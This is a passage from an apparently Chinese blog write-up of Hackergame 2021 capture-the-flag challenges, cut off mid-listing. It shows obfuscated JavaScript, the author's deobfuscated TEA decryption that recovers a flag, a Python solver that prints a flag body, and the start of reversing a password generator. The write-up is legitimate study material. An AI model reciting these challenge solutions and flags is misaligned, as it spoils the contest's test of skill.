class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _0x22517d = _0x2c9e; (<span class="function"><span class="keyword">function</span>(<span class="params">_0x2018e5, _0xd122c5</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x4a600d = _0x2c9e,</span><br><span class="line">_0x2e34d2 = _0x2018e5();</span><br><span class="line"><span class="keyword">while</span> ( !! []) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">const</span> _0x4d38c4 = -<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1b1</span>)) / <span class="number">0x1</span> * (<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1ad</span>)) / <span class="number">0x2</span>) + -<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1b2</span>)) / <span class="number">0x3</span> * (<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1b6</span>)) / <span class="number">0x4</span>) + -<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1ae</span>)) / <span class="number">0x5</span> * ( - <span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1b4</span>)) / <span class="number">0x6</span>) + <span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1ab</span>)) / <span class="number">0x7</span> * (<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1af</span>)) / <span class="number">0x8</span>) + <span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1b5</span>)) / <span class="number">0x9</span> + -<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1b3</span>)) / <span class="number">0xa</span> + -<span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1a9</span>)) / <span class="number">0xb</span> * ( - <span class="built_in">parseInt</span>(_0x4a600d(<span class="number">0x1a7</span>)) / <span class="number">0xc</span>);</span><br><span class="line"><span class="keyword">if</span> (_0x4d38c4 === _0xd122c5) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> _0x2e34d2[<span class="string">&#x27;push&#x27;</span>](_0x2e34d2[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">&#125; <span class="keyword">catch</span>(_0x416145) &#123;</span><br><span class="line">_0x2e34d2[<span class="string">&#x27;push&#x27;</span>](_0x2e34d2[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; (_0x381b, <span class="number">0x21c08</span>), <span class="built_in">String</span>[<span class="string">&#x27;prototype&#x27;</span>][_0x22517d(<span class="number">0x1a8</span>)] = <span class="function"><span class="keyword">function</span>(<span class="params">_0x6a2659</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x13519e = _0x22517d,</span><br><span class="line">_0x267e12 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>),</span><br><span class="line">_0x11a961 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line"><span class="keyword">let</span> _0x1bf548 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">plaintext = <span class="built_in">escape</span>(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> _0x485827 = <span class="number">0x0</span>; _0x485827 &lt; <span class="number">0x4</span>; _0x485827++) _0x11a961[_0x485827] = Str4ToLong(_0x6a2659[_0x13519e(<span class="number">0x1a6</span>)](_0x485827 * <span class="number">0x4</span>, (_0x485827 + <span class="number">0x1</span>) * <span class="number">0x4</span>));</span><br><span class="line"><span class="keyword">for</span> (_0x485827 = <span class="number">0x0</span>; _0x485827 &lt; plaintext[_0x13519e(<span class="number">0x1b8</span>)]; _0x485827 += <span class="number">0x8</span>) &#123;</span><br><span class="line">_0x267e12[<span class="number">0x0</span>] = Str4ToLong(plaintext[<span class="string">&#x27;slice&#x27;</span>](_0x485827, _0x485827 + <span class="number">0x4</span>)),</span><br><span class="line">_0x267e12[<span class="number">0x1</span>] = Str4ToLong(plaintext[_0x13519e(<span class="number">0x1a6</span>)](_0x485827 + <span class="number">0x4</span>, _0x485827 + <span class="number">0x8</span>)),</span><br><span class="line">code(_0x267e12, _0x11a961),</span><br><span class="line">_0x1bf548 += LongToBase16(_0x267e12[<span class="number">0x0</span>]) + LongToBase16(_0x267e12[<span class="number">0x1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x1bf548;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x2c9e</span>(<span class="params">_0x49e6ff, _0x310d40</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x381b4c = _0x381b();</span><br><span class="line"><span class="keyword">return</span> _0x2c9e = <span class="function"><span class="keyword">function</span>(<span class="params">_0x2c9ec6, _0x2ec3bd</span>) </span>&#123;</span><br><span class="line">_0x2c9ec6 = _0x2c9ec6 - <span class="number">0x1a6</span>;</span><br><span class="line"><span class="keyword">let</span> _0x4769df = _0x381b4c[_0x2c9ec6];</span><br><span class="line"><span class="keyword">return</span> _0x4769df;</span><br><span class="line">&#125;,</span><br><span class="line">_0x2c9e(_0x49e6ff, _0x310d40);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">code</span>(<span class="params">_0x167a71, _0x762113</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> _0x412874 = _0x167a71[<span class="number">0x0</span>],</span><br><span class="line">_0x3f9c14 = _0x167a71[<span class="number">0x1</span>];</span><br><span class="line"><span class="keyword">const</span> _0x540f95 = (<span class="number">0x52cfb2de</span> + <span class="number">0x4b67c6db</span>),</span><br><span class="line">_0x2bdc23 = _0x540f95 * <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">let</span> _0x4f8e47 = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">while</span> (_0x4f8e47 != _0x2bdc23) &#123;</span><br><span class="line">_0x412874 += (_0x3f9c14 &lt;&lt; <span class="number">0x4</span> ^ _0x3f9c14 &gt;&gt;&gt; <span class="number">0x5</span>) + _0x3f9c14 ^ _0x4f8e47 + _0x762113[_0x4f8e47 &amp; <span class="number">0x3</span>],</span><br><span class="line">_0x4f8e47 += _0x540f95,</span><br><span class="line">_0x3f9c14 += (_0x412874 &lt;&lt; <span class="number">0x4</span> ^ _0x412874 &gt;&gt;&gt; <span class="number">0x5</span>) + _0x412874 ^ _0x4f8e47 + _0x762113[_0x4f8e47 &gt;&gt;&gt; <span class="number">0xb</span> &amp; <span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line">_0x167a71[<span class="number">0x0</span>] = _0x412874,</span><br><span class="line">_0x167a71[<span class="number">0x1</span>] = _0x3f9c14;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Str4ToLong</span>(<span class="params">_0x288936</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0xf57f33 = _0x22517d;</span><br><span class="line"><span class="keyword">let</span> _0x283da9 = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> _0x1bfa1a = <span class="number">0x0</span>; _0x1bfa1a &lt; <span class="number">0x4</span>; _0x1bfa1a++) _0x283da9 |= _0x288936[_0xf57f33(<span class="number">0x1ac</span>)](_0x1bfa1a) &lt;&lt; _0x1bfa1a * <span class="number">0x8</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">isNaN</span>(_0x283da9) ? <span class="number">0x0</span>: _0x283da9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LongToBase16</span>(<span class="params">_0xad4470</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> _0x4176bf = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> _0x3c7880 = <span class="number">0x3</span>; _0x3c7880 &gt;= <span class="number">0x0</span>; _0x3c7880--) &#123;</span><br><span class="line"><span class="keyword">let</span> _0x43811c = (_0xad4470 &gt;&gt; <span class="number">0x8</span> * _0x3c7880 &amp; <span class="number">0xff</span>)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">parseInt</span>(<span class="string">&#x27;0x&#x27;</span> + _0x43811c) &lt;= <span class="number">0xf</span>) _0x43811c = <span class="string">&#x27;0&#x27;</span> + _0x43811c;</span><br><span class="line">_0x4176bf += _0x43811c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x4176bf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base16ToLong</span>(<span class="params">_0x203413</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x27c0c4 = _0x22517d;</span><br><span class="line"><span class="keyword">let</span> _0x48728d = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> _0x239fca = <span class="number">0x0</span>; _0x239fca &lt; <span class="number">0x8</span>; _0x239fca += <span class="number">0x2</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> _0x24e56c = <span class="built_in">parseInt</span>(<span class="string">&#x27;0x&#x27;</span> + _0x203413[_0x27c0c4(<span class="number">0x1a6</span>)](_0x239fca, _0x239fca + <span class="number">0x2</span>));</span><br><span class="line">_0x48728d = (_0x48728d &lt;&lt; <span class="number">0x8</span>) + _0x24e56c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x48728d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x381b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x4af9ee = [<span class="string">&#x27;encrypt&#x27;</span>, <span class="string">&#x27;33MGcQht&#x27;</span>, <span class="string">&#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;</span>, <span class="string">&#x27;14021KbbewD&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;808heYYJt&#x27;</span>, <span class="string">&#x27;5DlyrGX&#x27;</span>, <span class="string">&#x27;552oZzIQH&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;356IjESGA&#x27;</span>, <span class="string">&#x27;784713mdLTBv&#x27;</span>, <span class="string">&#x27;2529060PvKScd&#x27;</span>, <span class="string">&#x27;805548mjjthm&#x27;</span>, <span class="string">&#x27;844848vFCypf&#x27;</span>, <span class="string">&#x27;4bIkkcJ&#x27;</span>, <span class="string">&#x27;1356853149054377&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;1720848ZSQDkr&#x27;</span>];</span><br><span class="line">_0x381b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> _0x4af9ee;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">return</span> _0x381b();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LongToStr4</span>(<span class="params">_0x2f2e9e</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x416d95 = _0x22517d,</span><br><span class="line">_0x106afc = <span class="built_in">String</span>[_0x416d95(<span class="number">0x1b0</span>)](_0x2f2e9e &amp; <span class="number">0xff</span>, _0x2f2e9e &gt;&gt; <span class="number">0x8</span> &amp; <span class="number">0xff</span>, _0x2f2e9e &gt;&gt; <span class="number">0x10</span> &amp; <span class="number">0xff</span>, _0x2f2e9e &gt;&gt; <span class="number">0x18</span> &amp; <span class="number">0xff</span>);</span><br><span class="line"><span class="keyword">return</span> _0x106afc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gyflagh</span>(<span class="params">_0x111955</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x50051f = _0x22517d;</span><br><span class="line"><span class="keyword">let</span> _0x3b790d = _0x111955[_0x50051f(<span class="number">0x1a8</span>)](_0x50051f(<span class="number">0x1b7</span>));</span><br><span class="line"><span class="keyword">if</span> (_0x3b790d === _0x50051f(<span class="number">0x1aa</span>)) <span class="keyword">return</span> !! [];</span><br><span class="line"><span class="keyword">return</span> ! [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个js被混淆过, 可读性很差. 然后在网站找下有没有反混淆工具, 无果…<br>那就自己来吧, 一顿分析猛如虎, 《易得》：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.encrypt = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> l = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>),</span><br><span class="line">v = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line"><span class="keyword">let</span> r = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">plaintext = <span class="built_in">escape</span>(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; <span class="number">0x4</span>; i++) v[i] = Str4ToLong(s.slice(i * <span class="number">0x4</span>, (i + <span class="number">0x1</span>) * <span class="number">0x4</span>));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; plaintext.length; i += <span class="number">8</span>) &#123;</span><br><span class="line">l[<span class="number">0</span>] = Str4ToLong(plaintext.slice(i, i + <span class="number">0x4</span>)),</span><br><span class="line">l[<span class="number">1</span>] = Str4ToLong(plaintext.slice(i + <span class="number">0x4</span>, i + <span class="number">0x8</span>)),</span><br><span class="line">code(l, v),</span><br><span class="line">r += LongToBase16(l[<span class="number">0x0</span>]) + LongToBase16(l[<span class="number">0x1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">String</span>.prototype.decrypt = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> l = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>),</span><br><span class="line">v = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line"><span class="keyword">let</span> r = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">plaintext = <span class="built_in">escape</span>(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; <span class="number">0x4</span>; i++) v[i] = Str4ToLong(s.slice(i * <span class="number">0x4</span>, (i + <span class="number">0x1</span>) * <span class="number">0x4</span>));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; plaintext.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">l[<span class="number">0</span>] = Base16ToLong(plaintext.slice(i, i + <span class="number">8</span>)),</span><br><span class="line">l[<span class="number">1</span>] = Base16ToLong(plaintext.slice(i + <span class="number">8</span>, i + <span class="number">16</span>)),</span><br><span class="line">decode(l, v),</span><br><span class="line">r += LongToStr4(l[<span class="number">0x0</span>]) + LongToStr4(l[<span class="number">0x1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">code</span>(<span class="params">l, v</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> l0 = l[<span class="number">0x0</span>],</span><br><span class="line">l1 = l[<span class="number">0x1</span>];</span><br><span class="line"><span class="keyword">const</span> _0x540f95 = <span class="number">0x9E3779B9</span>,</span><br><span class="line">_0x2bdc23 = _0x540f95 * <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">let</span> i = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">while</span> (i != _0x2bdc23) &#123;</span><br><span class="line">l0 += (l1 &lt;&lt; <span class="number">0x4</span> ^ l1 &gt;&gt;&gt; <span class="number">0x5</span>) + l1 ^ i + v[i &amp; <span class="number">0x3</span>],</span><br><span class="line">i += _0x540f95,</span><br><span class="line">l1 += (l0 &lt;&lt; <span class="number">0x4</span> ^ l0 &gt;&gt;&gt; <span class="number">0x5</span>) + l0 ^ i + v[i &gt;&gt;&gt; <span class="number">0xb</span> &amp; <span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line">l[<span class="number">0x0</span>] = l0,</span><br><span class="line">l[<span class="number">0x1</span>] = l1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">l, v</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> l0 = l[<span class="number">0x0</span>],</span><br><span class="line">l1 = l[<span class="number">0x1</span>];</span><br><span class="line"><span class="keyword">const</span> _0x540f95 = <span class="number">0x9E3779B9</span>,</span><br><span class="line">_0x2bdc23 = _0x540f95 * <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">let</span> i = _0x2bdc23;</span><br><span class="line"><span class="keyword">while</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">l1 -= (l0 &lt;&lt; <span class="number">0x4</span> ^ l0 &gt;&gt;&gt; <span class="number">0x5</span>) + l0 ^ i + v[i &gt;&gt;&gt; <span class="number">0xb</span> &amp; <span class="number">0x3</span>];</span><br><span class="line">i -= _0x540f95;</span><br><span class="line">l0 -= (l1 &lt;&lt; <span class="number">0x4</span> ^ l1 &gt;&gt;&gt; <span class="number">0x5</span>) + l1 ^ i + v[i &amp; <span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line">l[<span class="number">0x0</span>] = l0,</span><br><span class="line">l[<span class="number">0x1</span>] = l1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Str4ToLong</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) r |= s.charCodeAt(i) &lt;&lt; i * <span class="number">0x8</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">isNaN</span>(r) ? <span class="number">0</span>: r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LongToBase16</span>(<span class="params">l</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x3</span>; i &gt;= <span class="number">0x0</span>; i--) &#123;</span><br><span class="line"><span class="keyword">let</span> _0x43811c = (l &gt;&gt; <span class="number">0x8</span> * i &amp; <span class="number">0xff</span>)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">parseInt</span>(<span class="string">&#x27;0x&#x27;</span> + _0x43811c) &lt;= <span class="number">0xf</span>) _0x43811c = <span class="string">&#x27;0&#x27;</span> + _0x43811c;</span><br><span class="line">s += _0x43811c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base16ToLong</span>(<span class="params">_0x203413</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> _0x48728d = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> _0x239fca = <span class="number">0x0</span>; _0x239fca &lt; <span class="number">0x8</span>; _0x239fca += <span class="number">0x2</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> _0x24e56c = <span class="built_in">parseInt</span>(<span class="string">&#x27;0x&#x27;</span> + _0x203413.slice(_0x239fca, _0x239fca + <span class="number">0x2</span>));</span><br><span class="line">_0x48728d = (_0x48728d &lt;&lt; <span class="number">0x8</span>) + _0x24e56c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x48728d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LongToStr4</span>(<span class="params">_0x2f2e9e</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> _0x106afc = <span class="built_in">String</span>.fromCharCode(_0x2f2e9e &amp; <span class="number">0xff</span>, _0x2f2e9e &gt;&gt; <span class="number">0x8</span> &amp; <span class="number">0xff</span>, _0x2f2e9e &gt;&gt; <span class="number">0x10</span> &amp; <span class="number">0xff</span>, _0x2f2e9e &gt;&gt; <span class="number">0x18</span> &amp; <span class="number">0xff</span>);</span><br><span class="line"><span class="keyword">return</span> _0x106afc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gyflagh</span>(<span class="params">flag</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> e = flag.encrypt(<span class="string">&#x27;1356853149054377&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (e === <span class="string">&#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;</span>) <span class="keyword">return</span> !! [];</span><br><span class="line"><span class="keyword">return</span> ! [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e = <span class="string">&#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;</span>.decrypt(<span class="string">&#x27;1356853149054377&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(e);</span><br><span class="line"><span class="built_in">console</span>.log(gyflagh(e));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后结果包上flag{}就行.</p><h2 id="超-OI-的-Writeup-模拟器-1"><a href="#超-OI-的-Writeup-模拟器-1" class="headerlink" title="超 OI 的 Writeup 模拟器 #1"></a>超 OI 的 Writeup 模拟器 #1</h2><p>这个我是人工反编译的, 不会写脚本, 后面十五小题就没看了.<br>快进到关键函数, 发现这个函数被扁平化了:<br><img src="/pictures/hackergame_2021_obv_1.jpg" alt="流程图"></p><p>然后分析了很久, 最后还是坐不住换了个方法. 由于i与输入参数无关, 那我们就在每个分支打断点, 然后跑一次查看流程, 结果是1跑了十一次, 2跑了一次:<br><img src="/pictures/hackergame_2021_obv_2.jpg" alt="代码"></p><p>然后写解密代码:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">0x10000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>: <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    d, x, y = exgcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> d, y, x - y * <span class="built_in">int</span>(a / b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">a, b, n</span>):</span></span><br><span class="line">    _, x, _ = exgcd(a, n)</span><br><span class="line">    <span class="keyword">return</span> x * b % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backward</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> solve((<span class="number">0x21DBA181B3901BAE</span> - a * <span class="number">0x58C5EC8BD3B2A4AA</span>) + <span class="number">1</span>, b, N), a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toascii</span>(<span class="params">n</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        s = s + <span class="built_in">chr</span>(n &amp; <span class="number">0xFF</span>)</span><br><span class="line">        n = n &gt;&gt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">a = solve(<span class="number">0xD71E1226CB47657F</span>, <span class="number">0xCB8D3677A9C1A3B2</span>, N)</span><br><span class="line">b = solve(<span class="number">0xC5E13B34BC5473E3</span>, <span class="number">0xA9C10ABDFFAB71F6</span>, N)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    a, b = backward(a, b)</span><br><span class="line"><span class="built_in">print</span>(toascii(a) + toascii(b))</span><br><span class="line"><span class="comment"># RrMAb3N4zXNYfOyT</span></span><br></pre></td></tr></table></figure></p><p>外面包上flag{}即可.</p><h2 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h2><p>题目意思大概是让我们从时间反向推出密码生成器的密码, 注意这里有个魔鬼细节: “差了八个小时”.<br>先不管啦, 直接分析网站上给出的密码生成器.<br>IDA打开, 发现很多代码. spy++看窗口类名, 呃好像是Qt写的, 感觉就不会了(立一个反向flag哈哈)<br>程序一般生成的是伪随机数, 也就是根据时间, CPU温度什么的用一系列算法生成随机数.<br>先找了下导入表中有没有srand函数和rand函数, 只有一个结果, 但打开看发现那个不是我们想要的.<br>再找一下time, 有一个_time64, 点开看发现很可疑. 在这里下个断点, 运行程序发现一切正常, 点生成密码按钮命中断点.<br>那应该就是这里了. 另外找一下ABC…XYZ这个字符串, 有十几个, 但到Z结束的只有前两个, 正是我们想要的, 旁边的特殊字符表和数字表也找到了:<br><img src="/pictures/hackergame_2021_pwdgen_1.jpg" alt="字母表"><br>然后开始看有time64的那个函数(为了阅读方便一些符号已经重命名而且添加了注释):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 